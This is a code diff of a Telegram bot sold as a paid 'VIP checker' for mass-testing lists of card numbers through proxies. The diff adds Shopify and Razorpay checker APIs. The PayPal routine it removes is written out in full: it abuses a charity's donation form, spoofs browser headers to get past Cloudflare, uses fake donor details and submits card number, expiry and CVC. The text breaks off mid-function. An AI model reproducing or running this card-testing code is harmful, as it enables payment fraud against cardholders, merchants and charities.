@@ -1,6 +1,6 @@
 # ==============================================================================
-# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐏𝐀𝐘𝐏𝐀𝐋 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (STEALTH PAYPAL HEADERS, SMART SITE ROTATION, FORCED GIF, CHARGED FONT)
+# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
+# (FORCED GIF ENGINE, EXACT CUSTOM EMOJIS, RAZORPAY API, CHARGED FONT)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -11,13 +11,12 @@ import time
 import json
 import re
 import io
-import base64
-import logging
 import sys
+import logging
 from html import unescape
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaAnimation
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
 from telegram.constants import ParseMode
@@ -30,14 +29,10 @@ from database2 import (
 
 # Logging configuration
 logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger("ShopifyVIP")
+logger = logging.getLogger("VIP_BOT")
 
 # ====================== CONFIG & GLOBALS ======================
-try: API_ID = int(os.getenv('API_ID', 0))
-except: API_ID = 0
-API_HASH = os.getenv('API_HASH', '').strip()
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
-
 ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]
 
 JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
@@ -47,9 +42,6 @@ HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()
 JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
 HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()
-
-# ⚠️ إعداد بوابة PayPal (تقدر تغير الدومين من هنا إذا تعطل الموقع القديم)
-PAYPAL_DONATE_DOMAIN = "https://www.callahandogs.com"
 
 def get_valid_target(link, chat_id):
     l = str(link).strip()
@@ -68,12 +60,14 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
+# APIs
+SHOPIFY_API_URL = 'https://autosh.up.railway.app/shopii'
+RAZORPAY_API_URL = 'https://web-production-6fd9c.up.railway.app/razorpay'
+
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
 WORKERS = 70  
-API_TIMEOUT = 30  
 DELAY = 2.0  
 HIT_DELAY = 1.0
 
@@ -126,15 +120,25 @@ def escape_html(text):
     if not text: return "Unknown"
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-# ====================== PREMIUM EMOJIS ======================
-CE_STAR = '<tg-emoji emoji-id="6201647288947839133">⭐</tg-emoji>'
-CE_FIRE = '<tg-emoji emoji-id="5445189224682779974">🔥</tg-emoji>'
-CE_GEAR = '<tg-emoji emoji-id="5445358884480916784">⚙️</tg-emoji>'
-CE_ROCKET = '<tg-emoji emoji-id="5445163772706582819">🚀</tg-emoji>'
-CE_TIME = '<tg-emoji emoji-id="5447311106030726740">⏱</tg-emoji>'
+# ====================== EXACT PREMIUM EMOJIS (FROM JSON) ======================
+CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
+CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
+CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
+CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
+CE_FLY = '<tg-emoji emoji-id="5231005931550030290">💸</tg-emoji>'
+CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
+CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
+CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
+CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
+CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
+CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
+CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
+CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
+CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
+CE_CLOWN = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
 
 # ====================== FLAGS ======================
-ALL_COUNTRY_CODES = ["AD","AE","AF","AG","AI","AL","AM","AO","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI","BJ","BL","BM","BN","BO","BQ","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CW","CX","CY","CZ","DE","DJ","DK","DM","DO","DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU","GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PH","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA","SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","SS","ST","SV","SX","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW","TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW"]
+ALL_COUNTRY_CODES = ["AE","AF","AR","AT","AU","BE","BG","BR","CA","CH","CL","CN","CO","CR","CZ","DE","DK","DZ","EC","EE","EG","ES","FI","FR","GB","GR","HK","HR","HU","ID","IE","IL","IN","IT","JP","KR","KW","KZ","LB","LT","LU","LV","MA","MT","MX","MY","NG","NL","NO","NZ","OM","PA","PE","PH","PK","PL","PT","QA","RO","RS","RU","SA","SE","SG","SI","SK","TH","TR","TW","UA","US","UY","VN","ZA"]
 COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}
 
 def get_flag_emoji(country_code, fallback="🏳️"):
@@ -150,10 +154,7 @@ ANIME_GIFS = [
     "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
     "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
     "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
-    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
-    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
-    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
-    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif"
+    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif"
 ]
 
 PLANS = {
@@ -174,15 +175,79 @@ def get_system_lock(name: str):
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Exception in update: {context.error}")
 
-def create_native_button(text: str, callback_data: str=None, url: str=None, style: str=None):
-    kwargs = {"text": text}
-    if callback_data: kwargs["callback_data"] = callback_data
-    if url: kwargs["url"] = url
-    if style: kwargs["style"] = style
-    return InlineKeyboardButton(**kwargs)
-
 def is_valid_url(link):
     return link and str(link).strip().startswith("http")
+
+# ====================== BULLETPROOF GIF DOWNLOADER & ENGINE ======================
+async def fetch_gif_bytes(url):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=15) as resp:
+                if resp.status == 200:
+                    bio = io.BytesIO(await resp.read())
+                    bio.name = "animation.gif"
+                    return bio
+    except Exception as e: logger.error(f"Failed to fetch GIF: {e}")
+    return None
+
+async def send_forced_gif(target_func, text, markup, url):
+    """Engine to force GIF sending by bypassing Telegram URL cache issues."""
+    media_to_send = _GIF_FILE_IDS.get(url, url)
+    try:
+        msg = await target_func(
+            animation=media_to_send, caption=text, reply_markup=markup,
+            parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
+        )
+        if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+            _GIF_FILE_IDS[url] = msg.animation.file_id
+        return msg
+    except Exception:
+        # Fallback: Download to memory and force upload
+        gif_io = await fetch_gif_bytes(url)
+        if gif_io:
+            try:
+                msg = await target_func(
+                    animation=gif_io, caption=text, reply_markup=markup,
+                    parse_mode=ParseMode.HTML, read_timeout=60, write_timeout=60
+                )
+                if getattr(msg, 'animation', None):
+                    _GIF_FILE_IDS[url] = msg.animation.file_id
+                return msg
+            except Exception: pass
+    
+    # Ultimate fallback if GIF completely fails
+    try:
+        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
+            return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except: pass
+    return None
+
+async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
+    markup = InlineKeyboardMarkup(buttons) if buttons else None
+    target = update.callback_query.message if update.callback_query else update.message
+    if not target: return None
+    url = specific_gif or random.choice(ANIME_GIFS)
+    if use_gif or specific_gif: return await send_forced_gif(target.reply_animation, text, markup, url)
+    try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception: return None
+
+async def styled_edit(msg, text, buttons=None):
+    markup = InlineKeyboardMarkup(buttons) if buttons else None
+    try:
+        if msg.animation or msg.photo or msg.video or msg.document: 
+            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
+        return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception: return None
+
+async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
+    markup = InlineKeyboardMarkup(buttons) if buttons else None
+    url = specific_gif or random.choice(ANIME_GIFS)
+    
+    async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
+    
+    if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
+    try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception: return None
 
 # ====================== DATABASE & LIMITS ======================
 async def load_keys():
@@ -213,109 +278,6 @@ def get_cc_limit(plan, uid=0):
 
 def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
-
-# ====================== BULLETPROOF GIF DOWNLOADER & ENGINE ======================
-async def fetch_gif_bytes(url):
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=10) as resp:
-                if resp.status == 200:
-                    bio = io.BytesIO(await resp.read())
-                    bio.name = "animation.gif"
-                    return bio
-    except Exception:
-        pass
-    return None
-
-async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
-    markup = InlineKeyboardMarkup(buttons) if buttons else None
-    target = update.callback_query.message if update.callback_query else update.message
-    if not target: return None
-
-    if use_gif or specific_gif:
-        url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = _GIF_FILE_IDS.get(url, url)
-        
-        try: 
-            msg = await target.reply_animation(
-                animation=media_to_send, 
-                caption=text, 
-                reply_markup=markup, 
-                parse_mode=ParseMode.HTML,
-                read_timeout=20,
-                write_timeout=20
-            )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                _GIF_FILE_IDS[url] = msg.animation.file_id
-            return msg
-        except Exception:
-            gif_io = await fetch_gif_bytes(url)
-            if gif_io:
-                try:
-                    msg = await target.reply_animation(
-                        animation=gif_io,
-                        caption=text,
-                        reply_markup=markup,
-                        parse_mode=ParseMode.HTML
-                    )
-                    if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                        _GIF_FILE_IDS[url] = msg.animation.file_id
-                    return msg
-                except Exception: pass
-
-    try: 
-        return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    except Exception: 
-        return None
-
-async def styled_edit(msg, text, buttons=None):
-    markup = InlineKeyboardMarkup(buttons) if buttons else None
-    try:
-        if msg.animation or msg.photo or msg.video or msg.document: 
-            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
-        return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    except Exception: 
-        return None
-
-async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
-    markup = InlineKeyboardMarkup(buttons) if buttons else None
-    if use_gif or specific_gif:
-        url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = _GIF_FILE_IDS.get(url, url)
-        
-        try: 
-            msg = await bot.send_animation(
-                chat_id=chat_id, 
-                animation=media_to_send, 
-                caption=text, 
-                reply_markup=markup, 
-                parse_mode=ParseMode.HTML,
-                read_timeout=20,
-                write_timeout=20
-            )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                _GIF_FILE_IDS[url] = msg.animation.file_id
-            return msg
-        except Exception:
-            gif_io = await fetch_gif_bytes(url)
-            if gif_io:
-                try:
-                    msg = await bot.send_animation(
-                        chat_id=chat_id,
-                        animation=gif_io,
-                        caption=text,
-                        reply_markup=markup,
-                        parse_mode=ParseMode.HTML
-                    )
-                    if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                        _GIF_FILE_IDS[url] = msg.animation.file_id
-                    return msg
-                except Exception: pass
-
-    try: 
-        return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    except Exception: 
-        return None
 
 # ====================== SESSIONS & EXTRACTION ======================
 _USER_HTTP_SESSIONS = {}
@@ -357,36 +319,48 @@ def parse_proxy_format(proxy):
     pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
     return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
 
-_CACHED_SITES = []
+_CACHED_SHOPIFY_SITES = []
+_CACHED_RAZOR_SITES = []
 _LAST_SITES_FETCH = 0
-async def get_github_sites():
-    global _CACHED_SITES, _LAST_SITES_FETCH
+
+async def get_shopify_sites():
+    global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     now = time.time()
-    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
+    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SHOPIFY_SITES
     try:
-        headers = {"User-Agent": "Mozilla/5.0"}
         async with aiohttp.ClientSession() as s:
-            async with s.get(GITHUB_SITES_URL, headers=headers, timeout=10) as r:
+            async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                 if r.status == 200:
-                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
+                    _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                     _LAST_SITES_FETCH = now
     except Exception: pass
-    if not _CACHED_SITES and os.path.exists('sites.txt'):
+    if not _CACHED_SHOPIFY_SITES and os.path.exists('sites.txt'):
         try:
             async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
-                _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
+                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
         except Exception: pass
-    return _CACHED_SITES
+    return _CACHED_SHOPIFY_SITES
+
+async def get_razor_sites():
+    global _CACHED_RAZOR_SITES
+    if _CACHED_RAZOR_SITES: return _CACHED_RAZOR_SITES
+    if not os.path.exists('sites1.txt'):
+        try:
+            async with aiofiles.open('sites1.txt', 'w', encoding='utf-8') as f: await f.write("razorpay-site.com\n")
+        except: pass
+    try:
+        async with aiofiles.open('sites1.txt', 'r', encoding='utf-8') as f:
+            _CACHED_RAZOR_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
+    except Exception: pass
+    return _CACHED_RAZOR_SITES
 
 # ====================== SMART SITE DEAD FILTER ======================
 def is_dead_site_error(err):
     if not err: return True
     e = str(err).lower()
     bad_keywords = [
-        'step 0', 'step 0 failed', 'step 10 failed', 'max ret', 'step0', 'incompatible', 
-        'receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 
-        'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 
-        'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'
+        'step 0', 'step 0 failed', 'max ret', 'cloudflare', 'timed out', 
+        'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'session_error'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -400,39 +374,33 @@ async def is_user_joined(uid, bot):
             except ValueError: cid = target
             member = await bot.get_chat_member(chat_id=cid, user_id=uid)
             if member.status in ['left', 'kicked', 'banned']: return False
-        except Exception:
-            pass 
+        except Exception: pass 
     return True
 
 async def send_welcome_menu(update_or_bot, uid, plan, limit):
-    admin_panel = f"\n\n<b>{CE_GEAR} {sf('Admin Panel')}:</b>\n ├ /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ /validate {sf('[key]')} - {sf('Check Key')}\n ├ /users - {sf('System Status')}\n ╰ /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
     
-    t = f"""<b>━━━ {CE_STAR} {sf('VIP CHECKER SYSTEM')} {CE_STAR} ━━━</b>
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
-<b>{CE_ROCKET} {sf('Checker Engine')}:</b>
+<b>{CE_TOP} {sf('Checker Engine')}:</b>
  ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
 
 <b>{CE_GEAR} {sf('Proxy Manager')}:</b>
- ├ /addpxy - {sf('Add Proxies')}
- ├ /proxy - {sf('View Proxies')}
- ╰ /rmpxy - {sf('Remove Proxies')}
+ ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
+ ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
 
-<b>{CE_STAR} {sf('Account Settings')}:</b>
- ├ /info - {sf('Profile Info')}
- ├ /redeem - {sf('Redeem Key')}
- ├ /fb - {sf('Send Feedback')}
- ╰ /plan - {sf('View Subscriptions')}{admin_panel}
+<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
+ ├ {CE_CANDLE} /info - {sf('Profile Info')}
+ ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
+ ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
+ ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}
 
-<b>👤 {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
+<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
-    
-    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
-    elif is_valid_url(JOIN_CHANNEL_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
-    elif is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
+    if is_valid_url(JOIN_GROUP_LINK): kb[-1].append(InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK))
         
     if isinstance(update_or_bot, Update):
         await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
@@ -451,15 +419,14 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return True
         
     kb = []
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
-    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
-    if not kb: return True
-    kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined", style="success")])
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
+    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
+    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined")])
     
-    await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
+    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== STRICT PAYPAL WITH STEALTH HEADERS ======================
+# ====================== GATEWAY APIs ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -470,143 +437,12 @@ async def get_bin_info(bin_code):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-async def check_paypal_donate_api(card, proxy):
+# 1. SHOPIFY API
+async def check_shopify_api(card, site, proxy, session):
     try:
-        parts = card.split('|')
-        if len(parts) < 4: return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
-        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
-        elif len(yy) == 4: yy = yy[-2:]
-        
-        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
-
-        price = "1"
-        urll = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/donate/"
-        
-        # 🌟 Stealth Headers to bypass Cloudflare/Wordfence
-        ua = random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        ])
-        
-        headers_get = {
-            'User-Agent': ua,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0'
-        }
-
-        connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
-            async with local_session.get(urll, headers=headers_get, proxy=proxy_str, timeout=20) as r1:
-                text1 = await r1.text()
-
-            # Catch Proxy Bans / Cloudflare Pages
-            if r1.status in [403, 429, 502, 503] or "cloudflare" in text1.lower() or "just a moment" in text1.lower():
-                return {'status': 'Site Error', 'message': 'Cloudflare Blocked Proxy', 'card': card, 'retry': True}
-
-            if "<html" in text1.lower() and "give-form-hash" not in text1.lower():
-                return {'status': 'Site Error', 'message': 'Gateway Layout Error (About Home)', 'card': card, 'retry': True}
-
-            try:
-                vaa = re.search(r'name="give-form-hash" value="(.*?)"', text1).group(1)
-                vaa2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text1).group(1)
-                vaa3 = re.search(r'name="give-form-id" value="(.*?)"', text1).group(1)
-                vaa4 = re.search(r'"data-client-token":"(.*?)"', text1).group(1)
-                decc = base64.b64decode(vaa4).decode('utf-8')
-                au = re.search(r'"accessToken":"(.*?)"', decc).group(1)
-            except Exception:
-                return {'status': 'Site Error', 'message': 'Token Extraction Blocked', 'card': card, 'retry': True}
-
-            url2 = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
-            payload2 = {
-                'give-honeypot': '', 'give-form-id-prefix': vaa2, 'give-form-id': vaa3,
-                'give-form-title': 'Make a Donation', 'give-current-url': urll, 'give-form-url': urll,
-                'give-form-minimum': price, 'give-form-maximum': '1000000', 'give-form-hash': vaa,
-                'give-price-id': '0', 'give-amount': price, 'payment-mode': 'paypal-commerce',
-                'give_title': 'Mr.', 'give_first': 'Gustave', 'give_last': 'Bruen',
-                'give_company_option': 'no', 'give_company_name': '', 'give_email': f'jdvdjsgwhsgy{random.randint(100,999)}@gmail.com',
-                'give_comment': '', 'card_name': 'Tome', 'card_exp_month': '', 'card_exp_year': '',
-                'billing_country': 'US', 'card_address': 'RTS 58/3 Bark Camp', 'card_address_2': '',
-                'card_city': 'Alkol', 'card_state': 'WV', 'card_zip': '25501', 'give-gateway': 'paypal-commerce'
-            }
-            
-            ajax_headers = headers_get.copy()
-            ajax_headers.update({'X-Requested-With': 'XMLHttpRequest'})
-            
-            async with local_session.post(url2, data=payload2, headers=ajax_headers, proxy=proxy_str, timeout=20) as r2:
-                ajax_res = await r2.text()
-                if r2.status != 200 or "<html" in ajax_res.lower():
-                    return {'status': 'Site Error', 'message': 'Order Endpoint Intercepted', 'card': card, 'retry': True}
-                try:
-                    j2 = json.loads(ajax_res)
-                    idd = j2['data']['id']
-                except:
-                    return {'status': 'Site Error', 'message': 'Order Configuration Crashed', 'card': card, 'retry': True}
-
-            url3 = f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source"
-            payload3 = {
-                "payment_source": {
-                    "card": {
-                        "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
-                        "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
-                    }
-                },
-                "application_context": {"vault": False}
-            }
-            headers3 = {
-                'User-Agent': ua, 'Accept-Encoding': "gzip, deflate, br, zstd", 'Content-Type': "application/json",
-                'authorization': "Bearer " + au, 'braintree-sdk-version': "3.32.0-payments-sdk-dev",
-                'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6"
-            }
-            async with local_session.post(url3, json=payload3, headers=headers3, proxy=proxy_str, timeout=20) as r3:
-                resp_text = await r3.text()
-
-            if "<html" in resp_text.lower() or "doctype" in resp_text.lower():
